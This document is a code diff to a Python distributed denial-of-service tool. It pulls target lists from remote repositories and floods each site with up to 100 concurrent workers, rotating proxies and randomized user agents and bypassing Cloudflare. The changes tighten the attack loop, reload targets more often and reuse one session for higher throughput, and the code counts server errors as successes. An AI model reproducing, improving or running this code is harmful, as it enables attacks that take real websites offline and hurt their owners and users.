@@ -17,7 +17,7 @@ from pyuseragents import random as random_useragent
 PARALLEL_COUNT = 100
 MAX_REQUESTS_TO_SITE = 200
 READ_TIMEOUT = 10
-RELOAD_TARGETS_TIMEOUT = 30 #minutes
+RELOAD_TARGETS_TIMEOUT = 10 #minutes
 
 SITES_HOSTS = ["https://gitlab.com/jacobean_jerboa/sample/-/raw/main/sample",
                "https://raw.githubusercontent.com/opengs/uashieldtargets/v2/sites.json"]
@@ -138,7 +138,7 @@ lastupdate = 0
 
 def updateResources():
     global lastupdate
-    if time.time() > lastupdate + 60*5:
+    if time.time() > lastupdate + 60 * RELOAD_TARGETS_TIMEOUT:
         lastupdate = time.time()
         sites.loadHosts(SITES_HOSTS)
         proxies.loadFile("proxy.json","ip")
@@ -148,39 +148,52 @@ def _get_headers() -> dict:
     headers['User-Agent'] = random_useragent()
     return headers
 
+
+
+session:CloudflareScraper = None
+async def getSession():
+    global session
+    if not session:
+        session = CloudflareScraper(timeout=TIMEOUT, trust_env=True)
+    return session
  
 async def worker(worker_id: int):
+    session = await getSession()
     while True:
-        async with CloudflareScraper(timeout=TIMEOUT, trust_env=True) as session:
-            url = sites.getNext()
-            if url:
-                work_item = WorkItem(url)
-                proxy_index = 0
+        # async with CloudflareScraper(timeout=TIMEOUT, trust_env=True) as session:
+        url = sites.getNext()
+        await asyncio.sleep(0)
+        if url:
+            work_item = WorkItem(url)
+            proxy_index = 0
 
-                while work_item.request_count<MAX_REQUESTS_TO_SITE:
-                    status = -1
-                    headers = _get_headers()
-            
-                    try:
-                        response = await asyncio.wait_for(session.get(work_item.url, headers=headers, proxy=work_item.proxy, verify_ssl=False), timeout=READ_TIMEOUT)
-                        status = response.status
-                    except Exception as e:
-                        # logger.debug(f'Error processing url {work_item.url}')
-                        pass
+            while (work_item.request_count<MAX_REQUESTS_TO_SITE) or (work_item.fail_count < 3):
+                status = -1
+                headers = _get_headers()
+        
+                try:
+                    response = await asyncio.wait_for(session.get(work_item.url, headers=headers, proxy=work_item.proxy, verify_ssl=False), timeout=READ_TIMEOUT)
+                    status = response.status
+                except Exception as e:
+                    # logger.debug(f'Error processing url {work_item.url}')
+                    pass
+                
+                work_item.request_count += 1
+
+                if (200 <= status <= 302) or (status >= 500):
+                    # logger.warning(f'[{worker_id}]  {work_item.url} - {status}, proxy: {work_item.proxy} ({work_item.request_count})')
+                    work_item.fail_count = 0
+                    await rcounter.incrementAlive()
+                else:
+                    work_item.fail_count += 1
+                    await rcounter.incrementNoResponse()
+                    # logger.debug(f'[{worker_id}] {work_item.url} - {status}, proxy: {work_item.proxy} ({work_item.request_count})')
                     
-                    work_item.request_count += 1
-
-                    if (200 <= status <= 302) or (status >= 500):
-                        # logger.warning(f'[{worker_id}]  {work_item.url} - {status}, proxy: {work_item.proxy} ({work_item.request_count})')
-                        await rcounter.incrementAlive()
-                    else:
-                        await rcounter.incrementNoResponse()
-                        # logger.debug(f'[{worker_id}] {work_item.url} - {status}, proxy: {work_item.proxy} ({work_item.request_count})')
-                        
-                        if proxy_index < proxies.count():
-                            proxy_list = proxies.getAll()
-                            work_item.proxy = f'http://{proxy_list[proxy_index]}'
-                            proxy_index += 1
+                    if proxy_index < proxies.count():
+                        proxy_list = proxies.getAll()
+                        work_item.proxy = f'http://{proxy_list[proxy_index]}'
+                        proxy_index += 1
+                await asyncio.sleep(0)
         
 
 async def timer():
@@ -197,9 +210,7 @@ def timer_loop():
 
     
 def main():
-
     Thread(target=timer_loop, daemon=True).start()
-
     updateResources()
     loop = asyncio.get_event_loop()
     union = asyncio.gather(*[
@@ -215,5 +226,4 @@ if __name__ == '__main__':
         stderr,
         format='<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>'
     )
-    # disable_warnings()
     main()
